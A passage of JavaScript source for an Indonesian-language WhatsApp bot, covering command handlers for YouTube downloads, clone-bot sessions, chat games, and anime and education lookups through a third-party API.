            /(?:http(?:s|):\/\/|)(?:(?:www\.|)youtube(?:\-nocookie|)\.com\/(?:watch\?.*(?:|\&)v=|embed\/|v\/)|youtu\.be\/)([-_0-9A-Za-z]{11})/gi;
          var arrey = [...kuoted.matchAll(ytIdRegex)].map((x) => x[1]);
          if (arrey.length == 0)
            return reply(
              `Reply hasil dari *${prefix}ytsearch* dengan perintah *${command}* urutan`
            );
          if (isNaN(args[1]))
            return reply(
              `Hanya support angka! pilih angka 1 sampai 10\nContoh : ${command} 2`
            );
          if (args[1] > arrey.length)
            return reply(
              `Urutan Hasil *${prefix}ytsearch* Hanya Sampai *${arrey.length}*`
            );
          reply("_*Wait...*_");
          let anu = await bochil.youtubedl(
            `https://youtube.com/watch?v=${arrey[args[1] - 1]}`
          );
          let data = await anu.audio["128kbps"].download();
          if (anu.audio["128kbps"].fileSize > 50000)
            return reply(
              `Ukuran melebihi batas maksimal 10 MB\n\n*link download*\n${data}`
            );
          tabrak.sendMessage(
            from,
            {
              audio: { url: data },
              mimetype: "audio/mp4",
              filename: `${anu.title}`,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: false,
                  mediaType: 1,
                  title: `${anu.title}`,
                  sourceUrl: `${q}`,
                  thumbnailUrl: anu.thumbnail,
                  renderLargerThumbnail: true,
                },
              },
            },
            { quoted: m }
          );
          limitAdd(sender, limit);
        }
        break;
      case prefix + "getvideo":
      case prefix + "getvidio":
        {
          if (isLimit(sender, isPremium, isOwner, limitCount, limit))
            return reply(
              `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
            );
          if (!isQuotedImage)
            return reply(
              `Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`
            );
          if (!m.quoted.fromMe)
            return reply(`Hanya bisa mengambil hasil dari pesan bot`);
          if (args.length < 2)
            return reply(
              `Balas hasil pencarian dari ${prefix}ytsearch dengan teks ${command} <no urutan>`
            );
          var kuoted = await m.quotedMsg.chts;
          var ytIdRegex =
            /(?:http(?:s|):\/\/|)(?:(?:www\.|)youtube(?:\-nocookie|)\.com\/(?:watch\?.*(?:|\&)v=|embed\/|v\/)|youtu\.be\/)([-_0-9A-Za-z]{11})/gi;
          var arrey = [...kuoted.matchAll(ytIdRegex)].map((x) => x[1]);
          if (arrey.length == 0)
            return reply(
              `Reply hasil dari *${prefix}ytsearch* dengan perintah *${command}* urutan`
            );
          if (isNaN(args[1]))
            return reply(
              `Hanya support angka! pilih angka 1 sampai 10\nContoh : ${command} 2`
            );
          if (args[1] > arrey.length)
            return reply(
              `Urutan Hasil *${prefix}ytsearch* Hanya Sampai *${arrey.length}*`
            );
          reply("_*Wait...*_");
          let anu = await bochil.youtubedl(
            `https://youtube.com/watch?v=${arrey[args[1] - 1]}`
          );
          let data = await anu.video["480p"].download();
          if (anu.video["480p"].fileSize > 50000)
            return reply(
              `Ukuran melebihi batas maksimal 10 MB\n\n*link download*\n${data}`
            );
          tabrak.sendMessage(
            from,
            {
              video: { url: data, caption: "© Team Tabrak Lurus" },
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: false,
                  mediaType: 1,
                  title: `${anu.title}`,
                  sourceUrl: `${q}`,
                  thumbnailUrl: anu.thumbnail,
                  renderLargerThumbnail: false,
                },
              },
            },
            { quoted: m }
          );
          limitAdd(sender, limit);
        }
        break;
      //end

      case prefix + "jadibot":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        /*
var messa = await baileys.prepareWAMessageMedia({ image: {url:"https://telegra.ph/file/21ba4ae05b63409ab8312.jpg"}}, { upload: tabrak.waUploadToServer })
    var catalog = await baileys.generateWAMessageFromContent(from, baileys.proto.Message.fromObject({
"productMessage": {
    "product": {
    "productImage": messa.imageMessage,
    "productId": "714468652888821",
    "title": 'Welcome To Bens Clone',
    "description": '-h To helping command',
    "currencyCode": "IDR",
    "priceAmount1000": "10000",
    "productImageCount": 2
  },
    "businessOwnerJid": "0@s.whatsapp.net",
    }
    }), m.quoted && m.quoted.fromMe ? {
	contextInfo: {
		...m.msg.contextInfo,
        title: `Team Tabrak Lurus`, 
        body: tuxt
	}
} : {})
await tabrak.relayMessage(from, catalog.message, {messageId:catalog.key.id})
*/
        reply("Tidak bisa jadibot di dalam clone");
        limitAdd(sender, limit);
        break;

      case prefix + "stopjadibot":
        if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        dir = path.join(__dirname, `./database/jadibot/${sender}`);
        let dirExist = await fs.existsSync(dir);
        console.log(dirExist);
        if (dirExist) {
          await rimraf(dir, async (err) => {
            if (err) return reply("Nomor ini tidak terdaftar sebagai bot!!");
            await tabrak.sendMessage(
              from,
              { text: "_Sukses menghapus session..." },
              { quoted: m }
            );
          });
        } else {
          return reply("Nomor ini tidak terdaftar sebagai bot!!");
        }
        break;
      case prefix + "listjadibot":
        try {
          let user = [
            ...new Set([
              ...global.conns
                .filter((tabrak) => tabrak.user)
                .map((tabrak) => tabrak.user),
            ]),
          ];
          te = "*List Bens Clone*\n\n";
          for (let i of user) {
            y = await decodeJid(i.id);
            te += " > Number : @" + y.split("@")[0] + "\n";
            te += " > Name : " + i.name + "\n\n";
          }
          tabrak.sendMessage(from, { text: te, mentions: [y] }, { quoted: m });
        } catch (err) {
          console.log(err);
          reply(`Belum Ada User Yang Jadibot`);
        }
        break;
      // Game Menu
      case prefix + "akinator":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isGame(sender, isOwner, gcount, glimit))
          return reply(`Limit game kamu sudah habis`);
        if (isGroup) return reply("Only private chat");
        if (akinator.hasOwnProperty(sender.split("@")[0]))
          return reply("Selesain yg sebelumnya dulu atuh");
        var get_result = await akiStart();
        if (get_result.status == 200) {
          var { server, frontaddr, session, signature, question, step } =
            get_result.result;
          const data = {};
          data["server"] = server;
          data["frontaddr"] = frontaddr;
          data["session"] = session;
          data["signature"] = signature;
          data["question"] = question;
          data["step"] = step;
          var ini_txt = `${question}\n\n`;
          ini_txt += "0 - Ya\n";
          ini_txt += "1 - Tidak\n";
          ini_txt += "2 - Saya Tidak Tau\n";
          ini_txt += "3 - Mungkin\n";
          ini_txt += "4 - Mungkin Tidak";
          tabrak
            .sendMessage(from, { text: ini_txt }, { quoted: m })
            .then(() => {
              akinator[sender.split("@")[0]] = data;
            });
          gameAdd(sender, glimit);
        } else {
          reply("ERROR: Hubungi owner");
        }
        break;
      case prefix + "cancelakinator":
      case prefix + "delakinator":
        if (isGroup) return reply("Only private chat");
        if (!akinator.hasOwnProperty(sender.split("@")[0]))
          return reply("Anda tidak memiliki akinator sebelumnya");
        delete akinator[sender.split("@")[0]];
        reply(`Sukses`);
        break;
      case prefix + "tictactoe":
      case prefix + "ttt":
      case prefix + "ttc":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (!isGroup) return reply("Only group chat");
        if (isGame(sender, isOwner, gcount, glimit))
          return reply(`Limit game kamu sudah habis`);
        if (isTicTacToe(from, tictactoe))
          return reply(`Masih ada game yg blum selesai`);
        if (args.length < 2)
          return reply(`Kirim perintah *${prefix}tictactoe* @tag`);
        if (mentionByTag.length !== 1) {
          if (mentionByTag[0] === botNumber)
            return reply(`Tidak bisa bermain dengan bot!`);
          if (mentionByTag[0] === sender)
            return reply(`Sad amat main ama diri sendiri`);
          var hadiah = randomNomor(100, 150);
          mentions(
            monospace(
              `@${sender.split("@")[0]} menantang @${
                mentionByTag[0].split("@")[0]
              } untuk bermain TicTacToe\n\nKirim (Y/N) untuk bermain\n\nHadiah : ${hadiah} balance`
            ),
            [sender, mentionByTag[0]],
            false
          );
          tictactoe.push({
            id: from,
            status: null,
            hadiah: hadiah,
            penantang: sender,
            ditantang: mentionByTag[0],
            TicTacToe: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"],
          });
          gameAdd(sender, limit);
        } else {
          reply(`Kirim perintah *${prefix}tictactoe* @tag`);
        }
        break;
      case prefix + "delttt":
      case prefix + "delttc":
        if (!isGroup) return reply("Only group chat");
        if (isGame(sender, isOwner, gcount, glimit))
          return reply(`Limit game kamu sudah habis`);
        if (!isTicTacToe(from, tictactoe))
          return reply(`Tidak ada sesi game tictactoe di grup ini`);
        var posi = getPosTic(from, tictactoe);
        if (tictactoe[posi].penantang.includes(sender)) {
          tictactoe.splice(posi, 1);
          reply(`Berhasil menghapus sesi tictactoe di grup ini`);
        } else if (tictactoe[posi].ditantang.includes(sender)) {
          tictactoe.splice(posi, 1);
          reply(`Berhasil menghapus sesi tictactoe di grup ini`);
        } else if (isGroupAdmins) {
          tictactoe.splice(posi, 1);
          reply(`Berhasil menghapus sesi tictactoe di grup ini`);
        } else if (isOwner) {
          tictactoe.splice(posi, 1);
          reply(`Berhasil menghapus sesi tictactoe di grup ini`);
        } else {
          reply(
            `Anda tidak bisa menghapus sesi tictactoe, karena bukan pemain!`
          );
        }
        break;
      case prefix + "tebakgambar":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isGame(sender, isOwner, gcount, glimit))
          return reply(`Limit game kamu sudah habis`);
        if (isPlayGame(from, tebakgambar))
          return greply(
            from,
            `Masih ada game yang belum diselesaikan`,
            tebakgambar[getGamePosi(from, tebakgambar)].m
          );
        require("kotz-api")
          .tebakgambar()
          .then((data) => {
            data = data[0];
            data.jawaban = data.jawaban.split("Jawaban ").join("");
            var teks =
              `*TEBAK GAMBAR*\n\n` +
              monospace(
                `Petunjuk : ${data.jawaban.replace(
                  /[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
                  "_"
                )}\nWaktu : ${gamewaktu}s`
              );
            tabrak
              .sendMessage(
                from,
                { image: { url: data.image }, caption: teks },
                { quoted: m }
              )
              .then((res) => {
                var jawab = data.jawaban.toLowerCase();
                addPlayGame(
                  from,
                  "Tebak Gambar",
                  jawab,
                  gamewaktu,
                  res,
                  tebakgambar
                );
                gameAdd(sender, glimit);
              });
          });
        break;

      //edukasi Menu
      case prefix + "roboguru":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (!q) return reply("Contoh: .roboguru boedi oetomo|sma|sejarah");
        aw = q.split("|")[0];
        kel = q.split("|")[1];
        sub = q.split("|")[2];
        let robo = await fetchJson(
          `https://api.lolhuman.xyz/api/roboguru?apikey=${global.lolkey}&query=${aw}&grade=${kel}&subject=${sub}`
        );
        reply(
          `Question: ${robo.result[0].question}\nAnswer: ${robo.result[0].answer}`
        );
        break;
      case prefix + "brainly":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (!q) return reply("Contoh: .brainly kali kurang tambah");
        let bra = await fetchJson(
          `https://api.lolhuman.xyz/api/brainly?apikey=${global.lolkey}&query=${q}`
        );
        reply(bra.result[0].answer);
        break;
      case prefix + "wiki":
      case prefix + "wikipedia":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (!q) return reply("Contoh: .wikipedia nasi goreng");
        let wik = await fetchJson(
          `https://api.lolhuman.xyz/api/wiki?apikey=${global.lolkey}&query=${q}`
        );
        reply(wik.result);
        break;

      //anime Menu
      case prefix + "whatanime":
      case prefix + "wnime":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (isImage || isQuotedImage) {
          dwn = await downloadAndSaveMediaMessage("image", "wnim.jpg");
          up = await uploadImages(fs.readFileSync(dwn));
          res = await fetchJson(
            `https://api.lolhuman.xyz/api/wait?apikey=${global.lolkey}&img=${up}`
          );
          let txet = `_*WHAT ANIME RESULT*_

TITLE ROMAJI: ${res.result.title_romaji}
TITLE NATIVE: ${res.result.title_native}
TITLE ENGLISH: ${res.result.title_english}
EPISODE: ${res.result.episode}
AT: ${res.result.at}
VIDEO URL: ${res.result.video}`;
          tabrak.sendMessage(from, { text: txet }, { quoted: m });
          fs.unlinkSync(dwn);
        } else {
          reply("kirim gambar/reply gambar");
        }
        limitAdd(sender, limit);
        break;
      case prefix + "whatmanga":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (isLimit(sender, isPremium, isOwner, limitCount, limit))
          return reply(
            `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
          );
        if (isImage || isQuotedImage) {
          dwn = await downloadAndSaveMediaMessage("image", "wnim.jpg");
          up = await uploadImages(fs.readFileSync(dwn));
          res = await fetchJson(
            `https://api.lolhuman.xyz/api/wait?apikey=${global.lolkey}&img=${up}`
          );
          txet = `_*WHAT MANGA RESULT*_

TITLE: ${res.result[0].title}
PART: ${res.result[0].part}
KEMIRIPAN: ${res.result[0].similarity}
LINK: ${res.result[0].urls[0]}`;
          tabrak.sendMessage(from, { text: txet }, { quoted: m });
          fs.unlinkSync(dwn);
        } else {
          reply("kirim gambar/reply gambar");
        }
        limitAdd(sender, limit);
        break;
      case prefix + "animesearch":
      case prefix + "otakudesu":
        addCountCmd(command.split(prefix)[1], sender, _cmd);
        if (!q) return reply("Contoh: .animesearch golden time");
        res = await fetchJson(
          `https://api.lolhuman.xyz/api/otakudesusearch?apikey=${global.lolkey}&query=${q}`
        );
        down = res.result.link_dl;
        let txu = `_*ANIME SEARCH RESULT*_

TITLE: ${res.result.title}
KANJI: ${res.result.japanese}
JUDUL: ${res.result.judul}
TYPE: ${res.result.type}
EPISODE: ${res.result.episodes}
GENRE: ${res.result.genres}
DURASI: ${res.result.duration}

_*DOWNLOAD LINK:*_`;

        var jumlah = 15;
        if (down.length < jumlah) jumlah = down.length;
        var no = 0;
        for (let i = 0; i < jumlah; i++) {
          no += 1;
          txu += `\n
TITLE: ${down[i].title.link_dl[0]}
RESO: ${down[i].link_dl[0].reso}
SIZE: ${down[i].link_dl[0].size}
LINK DOWNLOAD: ${down[i].link_dl[0].link_dl.Mega}\n`;
        }
        reply(txu);
        break;

      //NO PREF line
      case "-h":
        let toks = `_*Helping Command*_

_*• TOOLS •*_
_1. sticker_
Usage:
_Kirim/reply media image/video/gif & command #sticker_

_2. tourl_
Usage:
_Kirim/reply media image/video/gif & command #tourl_


_*• DOWNLOADER •*_
_1. Instagram download_
Usage:
_Kirim perintah #igdl link media Instagram_

_2. Facebook download_
Usage:
_Kirim perintah #fbdl link media Facebook_

_3. Tiktok download_
Usage:
_Kirim perintah #tiktok link media Tiktok_

_4. YouTube search_
Usage:
_Kirim perintah #yts dj breakbeat_\n_Untuk mengambil hasil nya, reply hasil search, dan commamd:_\n#getvideo/#getmusic nomor urutan_

_5. Pinterest_
Usage:
_Kirim perintah #pinterest cecan Or #pinterest cecan --10_


_*• Buy/Transfer •*_
_1. Buy limit_
Usage:
_Kirim perintah #buylimit jumlah yang ingin di beli_

_2. Transfer_
Usage:
_Kirim perintah #transfer @tag jumlah yang ingin di transfer_
`;
        reply(toks);
        break;
    }
  } catch (e) {
    m.reply(util.format(e));
  }
};
